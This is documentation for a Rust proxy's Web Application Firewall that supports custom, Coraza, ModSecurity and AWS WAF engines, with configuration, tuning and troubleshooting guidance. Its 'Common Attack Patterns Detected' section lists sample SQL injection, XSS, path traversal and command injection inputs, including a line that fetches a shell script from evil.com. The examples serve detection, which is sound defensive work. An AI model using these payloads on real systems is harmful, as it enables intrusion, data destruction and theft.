# Web Application Firewall (WAF) - Multi-Engine Implementation

## Overview

The Rust Proxy includes a comprehensive Web Application Firewall (WAF) system that supports multiple engines through an adapter pattern. This allows you to choose the best WAF solution for your needs or even combine multiple engines.

## Supported Engines

### 1. Custom Engine (Default)
A lightweight, fast pattern-based WAF engine with basic security features.

**Features:**
- SQL Injection detection
- XSS protection
- Path traversal prevention
- User-Agent filtering
- IP-based rate limiting
- Zero external dependencies

**Best for:** Simple applications, development, or as a first line of defense.

### 2. Coraza Engine
OWASP Core Rule Set (CRS) compatible engine with advanced threat detection.

**Features:**
- OWASP CRS v4.x compatible rules
- Anomaly scoring system
- Paranoia levels (1-4)
- SQL injection detection
- XSS protection
- Remote Code Execution (RCE) detection
- Local/Remote File Inclusion (LFI/RFI) prevention
- Session fixation protection
- Protocol attack detection

**Best for:** Production applications requiring comprehensive security with industry-standard rules.

### 3. ModSecurity Engine
ModSecurity v3 compatible engine supporting SecRule syntax.

**Features:**
- ModSecurity v3 rule syntax
- SecRule directives
- Detection-only or blocking mode
- Request/response body inspection
- Variable collections
- Regex operators
- Custom rule loading

**Best for:** Organizations with existing ModSecurity rules or requiring ModSecurity compatibility.

### 4. AWS WAF Engine
Integration with AWS WAF v2 for cloud-native security.

**Features:**
- AWS WAF v2 API integration
- Managed rule groups (AWS and Marketplace)
- Custom rule groups
- IP sets and regex pattern sets
- Rate-based rules
- Geographic blocking
- Fallback modes for high availability

**Best for:** AWS-hosted applications or organizations using AWS security infrastructure.

## Architecture

### Adapter Pattern

All WAF engines implement the `WafEngine` trait:

```rust
pub trait WafEngine: Send + Sync {
    fn name(&self) -> &'static str;
    fn is_available(&self) -> bool;
    fn check_request(&self, context: &WafContext) -> WafDecision;
    fn get_stats(&self) -> WafStats;
    fn get_info(&self) -> WafEngineInfo;
}
```

This allows:
- Hot-swapping between engines
- Consistent API across all engines
- Easy addition of new engines
- Engine-specific optimizations

## Configuration

### YAML Configuration

#### Custom Engine
```yaml
waf:
  enabled: true
  mode: custom
  block_mode: true
  max_body_size: 1048576  # 1 MB
  custom:
    sql_injection_protection: true
    xss_protection: true
    path_traversal_protection: true
    user_agent_filtering: true
    rate_limit_enabled: true
    rate_limit_requests: 100
    rate_limit_window_secs: 60
```

#### Coraza Engine
```yaml
waf:
  enabled: true
  mode: coraza
  block_mode: true
  coraza:
    enable_crs: true
    paranoia_level: 2  # 1-4, higher = stricter
    anomaly_threshold: 5  # Score threshold for blocking
    sql_injection_rules: true
    xss_rules: true
    rce_rules: true
    lfi_rules: true
    rfi_rules: true
    session_fixation_rules: true
    protocol_attack_rules: true
```

#### ModSecurity Engine
```yaml
waf:
  enabled: true
  mode: modsecurity
  block_mode: true
  modsecurity:
    enabled: true
    detection_mode: on  # on, detectiononly, off
    request_body_access: true
    response_body_access: false
    request_body_limit: 1048576
    rules_file: /etc/modsecurity/rules.conf
    inline_rules:
      - 'SecRule ARGS "@rx (union|select)" "id:1000,phase:2,block"'
```

#### AWS WAF Engine
```yaml
waf:
  enabled: true
  mode: aws
  block_mode: true
  aws:
    enabled: true
    region: us-east-1
    web_acl_arn: arn:aws:wafv2:us-east-1:123456789012:regional/webacl/myacl/uuid
    managed_rule_groups:
      - aws_common_rules
      - aws_known_bad_inputs
      - aws_sql_database
    use_local_cache: true
    cache_ttl_secs: 300
    fallback_action: allow  # allow or block
```

## Usage Examples

### Rust Code Examples

#### 1. Using Custom Engine

```rust
use rust_proxy::middleware::waf::{WafMiddleware, CustomWafConfig};

// Create with defaults
let waf = WafMiddleware::with_custom(CustomWafConfig::default());

// Or customize
let config = CustomWafConfig {
    sql_injection_protection: true,
    xss_protection: true,
    rate_limit_enabled: true,
    rate_limit_requests: 50,
    rate_limit_window_secs: 60,
    ..Default::default()
};
let waf = WafMiddleware::with_custom(config);
```

#### 2. Using Coraza Engine

```rust
use rust_proxy::middleware::waf::{WafMiddleware, CorazaConfig};

let config = CorazaConfig {
    enable_crs: true,
    paranoia_level: 2,
    anomaly_threshold: 5,
    sql_injection_rules: true,
    xss_rules: true,
    rce_rules: true,
    ..Default::default()
};

let waf = WafMiddleware::with_coraza(config);
```

#### 3. Using ModSecurity Engine

```rust
use rust_proxy::middleware::waf::{
    WafMiddleware, ModSecurityConfig, DetectionMode
};

let config = ModSecurityConfig {
    enabled: true,
    detection_mode: DetectionMode::On,
    request_body_access: true,
    ..Default::default()
};

let waf = WafMiddleware::with_modsecurity(config)?;
```

#### 4. Using AWS WAF Engine

```rust
use rust_proxy::middleware::waf::{
    WafMiddleware, AwsWafConfig, ManagedRuleGroup, FallbackAction
};

let config = AwsWafConfig {
    enabled: true,
    region: "us-east-1".to_string(),
    web_acl_arn: Some("arn:aws:wafv2:...".to_string()),
    managed_rule_groups: vec![
        ManagedRuleGroup::AwsCommonRules,
        ManagedRuleGroup::AwsSqlDatabase,
    ],
    fallback_action: FallbackAction::Allow,
    ..Default::default()
};

let waf = WafMiddleware::with_aws(config)?;
```

#### 5. Using WafConfig (Generic)

```rust
use rust_proxy::middleware::waf::{WafMiddleware, WafConfig, WafMode};

let mut config = WafConfig::default();
config.mode = WafMode::Coraza;
config.block_mode = true;
config.coraza = Some(CorazaConfig::default());

let waf = WafMiddleware::new(config)?;
```

### Getting Statistics

```rust
// Get overall statistics
let stats = waf.get_stats();
println!("Total requests: {}", stats.total_requests);
println!("Blocked: {}", stats.blocked_requests);
println!("Allowed: {}", stats.allowed_requests);

// Get engine information
let info = waf.get_engine_info();
println!("Engine: {} v{}", info.name, info.version);
println!("Available: {}", info.available);
println!("Features: {:?}", info.features);
```

## Paranoia Levels (Coraza)

The Coraza engine supports different paranoia levels:

### Level 1 (Default for production)
- Basic protection
- Minimal false positives
- Good performance
- Recommended for most applications

### Level 2 (Recommended)
- Enhanced protection
- More rules enabled
- Slight performance impact
- Good balance of security and usability

### Level 3
- Strict protection
- Many rules enabled
- May cause false positives
- Review logs carefully

### Level 4
- Maximum protection
- All rules enabled
- High false positive rate
- Requires extensive tuning

## Anomaly Scoring (Coraza)

Coraza uses anomaly scoring instead of immediate blocking:

- Each triggered rule adds to the anomaly score
- When the score exceeds the threshold, the request is blocked
- Default threshold: 5
- Higher threshold = more tolerant
- Lower threshold = stricter

**Example:**
```
Request triggers:
- SQL injection pattern (score: 5)
- Multiple slashes (score: 2)
Total score: 7

If threshold is 5: BLOCKED
If threshold is 10: ALLOWED
```

## Detection Modes (ModSecurity)

### On Mode
- Evaluate rules
- Block malicious requests
- Log violations
- Production mode

### DetectionOnly Mode
- Evaluate rules
- Log violations
- **Do not block**
- Testing/tuning mode

### Off Mode
- WAF completely disabled
- No processing
- Maintenance mode

## Performance Considerations

### Custom Engine
- **Fastest**: Minimal overhead
- **Memory**: ~1-2 MB per instance
- **Throughput**: 50,000+ req/s

### Coraza Engine
- **Fast**: Optimized regex matching
- **Memory**: ~10-20 MB per instance
- **Throughput**: 20,000+ req/s

### ModSecurity Engine
- **Moderate**: Rule evaluation overhead
- **Memory**: ~15-30 MB per instance
- **Throughput**: 10,000+ req/s

### AWS WAF Engine
- **Variable**: Depends on API latency
- **Memory**: ~5 MB per instance
- **Throughput**: Limited by AWS API

### Optimization Tips

1. **Use rate limiting** to prevent abuse
2. **Enable caching** (AWS WAF)
3. **Tune paranoia levels** based on traffic
4. **Use detection-only mode** for new rules
5. **Monitor false positives**
6. **Adjust anomaly thresholds** as needed

## Security Best Practices

### 1. Defense in Depth
```yaml
# Use WAF as part of layered security
security:
  waf:
    enabled: true
    mode: coraza
  rate_limiting: true
  tls:
    min_version: "1.3"
  authentication:
    required: true
```

### 2. Regular Updates
- Keep WAF rules updated
- Monitor security advisories
- Test updates in staging first

### 3. Monitoring
```rust
// Monitor WAF statistics
let stats = waf.get_stats();
if stats.blocked_requests > threshold {
    alert_security_team();
}
```

### 4. Tuning
```yaml
# Start with DetectionOnly
waf:
  mode: modsecurity
  modsecurity:
    detection_mode: detectiononly

# Analyze logs, tune rules, then enable blocking
# After tuning:
modsecurity:
  detection_mode: on
```

### 5. False Positive Handling
```yaml
# Coraza: Increase threshold
coraza:
  anomaly_threshold: 10  # More tolerant

# Or disable specific rule categories
coraza:
  session_fixation_rules: false  # If causing issues
```

## Common Attack Patterns Detected

### SQL Injection
```
' OR '1'='1
1' UNION SELECT * FROM users--
admin'--
'; DROP TABLE users; --
```

### XSS (Cross-Site Scripting)
```
<script>alert('XSS')</script>
javascript:alert(1)
<img onerror=alert(1)>
<svg onload=malicious()>
```

### Path Traversal
```
../../etc/passwd
..\\..\\windows\\system32
%2e%2e/secrets
```

### Remote Code Execution
```
; cat /etc/passwd
| whoami
$(curl evil.com/shell.sh)
```

### Command Injection
```
& dir
; ls -la
`id`
$(uname -a)
```

## Troubleshooting

### High False Positives

**Solution 1: Adjust Paranoia Level**
```yaml
coraza:
  paranoia_level: 1  # Reduce from 2
```

**Solution 2: Increase Anomaly Threshold**
```yaml
coraza:
  anomaly_threshold: 10  # Increase from 5
```

**Solution 3: Use Detection-Only Mode**
```yaml
modsecurity:
  detection_mode: detectiononly
```

### Performance Issues

**Solution 1: Reduce Body Inspection**
```yaml
waf:
  max_body_size: 262144  # 256 KB instead of 1 MB
```

**Solution 2: Use Simpler Engine**
```yaml
waf:
  mode: custom  # Instead of coraza
```

**Solution 3: Enable Caching**
```yaml
aws:
  use_local_cache: true
  cache_ttl_secs: 600
```

### Missing Detections

**Solution 1: Increase Paranoia Level**
```yaml
coraza:
  paranoia_level: 3  # More rules
```

**Solution 2: Lower Anomaly Threshold**
```yaml
coraza:
  anomaly_threshold: 3  # Stricter
```

**Solution 3: Enable All Rule Categories**
```yaml
coraza:
  sql_injection_rules: true
  xss_rules: true
  rce_rules: true
  lfi_rules: true
  rfi_rules: true
```

## Migration Guide

### From Custom to Coraza

```yaml
# Before
waf:
  mode: custom
  custom:
    sql_injection_protection: true

# After
waf:
  mode: coraza
  coraza:
    enable_crs: true
    paranoia_level: 2
```

### From ModSecurity to Coraza

Both use similar rule concepts, but:
- Coraza uses anomaly scoring by default
- Rule IDs are different (CRS standard)
- Configuration syntax differs

### Adding AWS WAF

```yaml
# Enable AWS WAF with fallback
waf:
  mode: aws
  aws:
    enabled: true
    web_acl_arn: ${AWS_WAF_ACL_ARN}
    fallback_action: allow  # Graceful degradation
    managed_rule_groups:
      - aws_common_rules
```

## Example Configurations

### Startup/Development
```yaml
waf:
  enabled: true
  mode: custom
  block_mode: false  # Log only
```

### Small Production App
```yaml
waf:
  enabled: true
  mode: coraza
  block_mode: true
  coraza:
    paranoia_level: 1
    anomaly_threshold: 5
```

### Enterprise Production
```yaml
waf:
  enabled: true
  mode: coraza
  block_mode: true
  coraza:
    paranoia_level: 2
    anomaly_threshold: 5
    enable_crs: true
    sql_injection_rules: true
    xss_rules: true
    rce_rules: true
```

### AWS Cloud-Native
```yaml
waf:
  enabled: true
  mode: aws
  aws:
    enabled: true
    region: us-east-1
    web_acl_arn: arn:aws:wafv2:...
    managed_rule_groups:
      - aws_common_rules
      - aws_known_bad_inputs
      - aws_sql_database
    fallback_action: allow
```

## Testing

### Run WAF Tests
```bash
cargo test --test waf_integration_tests
```

### Test Specific Engine
```bash
cargo test --test waf_integration_tests test_coraza_engine
```

### Benchmark Performance
```bash
cargo bench --bench waf_bench
```

## Additional Resources

- [OWASP Core Rule Set Documentation](https://coreruleset.org/)
- [ModSecurity Reference Manual](https://github.com/SpiderLabs/ModSecurity/wiki)
- [AWS WAF Developer Guide](https://docs.aws.amazon.com/waf/)
- [WAF Testing Guide](./WAF_TESTING.md)

## Support

For issues or questions:
1. Check logs for detailed error messages
2. Review statistics for patterns
3. Test in detection-only mode first
4. Open an issue with reproduction steps
